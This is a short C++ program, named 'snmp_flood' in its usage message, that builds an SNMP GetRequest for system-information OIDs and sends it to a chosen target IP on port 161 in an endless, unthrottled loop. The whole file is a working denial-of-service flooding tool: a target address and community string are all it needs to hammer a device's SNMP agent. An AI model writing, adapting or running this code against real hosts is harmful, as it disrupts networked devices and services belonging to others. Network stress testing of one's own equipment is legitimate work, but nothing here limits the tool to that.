#include <vector>
#include <string_view>
#include <iterator>
#include <algorithm>
#include <string>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <arpa/inet.h>

static std::vector<uint8_t> make_snmpget(std::string_view community)
{
    std::vector<uint8_t> buffer;
    auto ptr = std::back_inserter(buffer);

    // start seq
    *ptr++ = 0x30;
    *ptr++ = 0x81;
    *ptr++ = 0;

    // version
    *ptr++ = 2;
    *ptr++ = 1;
    *ptr++ = 1;

    // community
    if (community.size() >= 128) {
        fprintf(stderr, "Community string must be less than 128 bytes\n");
        exit(1);
    }
    *ptr++ = 4;
    *ptr++ = community.size();
    std::copy(community.begin(), community.end(), ptr);

    // Start get request
    *ptr++ = 0xA0;
    *ptr++ = 0x81;
    auto const pdu_len_pos = buffer.size();
    *ptr++ = 0;

    // Request ID
    *ptr++ = 2;
    *ptr++ = 1;
    *ptr++ = 1;

    // errorStatus
    *ptr++ = 2;
    *ptr++ = 1;
    *ptr++ = 0;

    // errorIndex
    *ptr++ = 2;
    *ptr++ = 1;
    *ptr++ = 0;

    // Varbind list
    *ptr++ = 0x30;
    *ptr++ = 0x81;
    auto const varbindlist_len_pos = buffer.size();
    *ptr++ = 0;

    // Macros to define each varbind block
    #define VARBIND(seq...) { const uint8_t temp[] = { seq }; buffer.insert(buffer.end(), std::begin(temp), std::end(temp)); }

    VARBIND(
        0x30, 12, 6, 8, 43, 6, 1, 2, 1, 1, 1, 0, 5, 0 // sysDescr.0
    )
    VARBIND(
        0x30, 12, 6, 8, 43, 6, 1, 2, 1, 1, 2, 0, 5, 0 // sysObjectID.0
    )
    VARBIND(
        0x30, 12, 6, 8, 43, 6, 1, 2, 1, 1, 3, 0, 5, 0 // sysUpTime.0
    )
    VARBIND(
        0x30, 12, 6, 8, 43, 6, 1, 2, 1, 1, 4, 0, 5, 0 // sysContact.0
    )
    VARBIND(
        0x30, 12, 6, 8, 43, 6, 1, 2, 1, 1, 5, 0, 5, 0 // sysName.0
    )
    VARBIND(
        0x30, 12, 6, 8, 43, 6, 1, 2, 1, 1, 6, 0, 5, 0 // sysLocation.0
    )
    VARBIND(
        0x30, 14, 6, 10, 43, 6, 1, 6, 3, 10, 1, 1, 0, 5, 0 // snmpEngineID.0
    )
    VARBIND(
        0x30, 14, 6, 10, 43, 6, 1, 6, 3, 10, 2, 1, 0, 5, 0 // snmpEngineBoots.0
    )
    VARBIND(
        0x30, 14, 6, 10, 43, 6, 1, 6, 3, 10, 2, 1, 0, 5, 0 // snmpEngineBoots.0 (again)
    )

    // Update varbind list len
    {
        int len = (buffer.size() - varbindlist_len_pos) - 1;
        buffer[varbindlist_len_pos] = len;
    }

    // Update PDU len
    {
        int len = (buffer.size() - pdu_len_pos) - 1;
        buffer[pdu_len_pos] = len;
    }

    // Update the packet length
    {
        int packet_len = buffer.size() - 3;
        buffer[2] = packet_len;
    }

    return buffer;
}

int main(int argc, char **argv)
{
    if (argc != 3) {
        fprintf(stderr, "Usage: snmp_flood <community> <target_ip>\n");
        return 1;
    }

    auto const sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == -1) {
        perror("socket");
        return 1;
    }

    std::string community = argv[1];

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(161);
    if (inet_aton(argv[2], &addr.sin_addr) == 0) {
        fprintf(stderr, "Invalid IP address: %s\n", argv[2]);
        return 1;
    }

    auto addr_ptr = reinterpret_cast<sockaddr const*>(&addr);
    auto const buffer = make_snmpget(community);

    while (true) {
        if (sendto(sock, buffer.data(), buffer.size(), 0, addr_ptr, sizeof(addr)) == -1) {
            perror("send()");
        }
    }
}
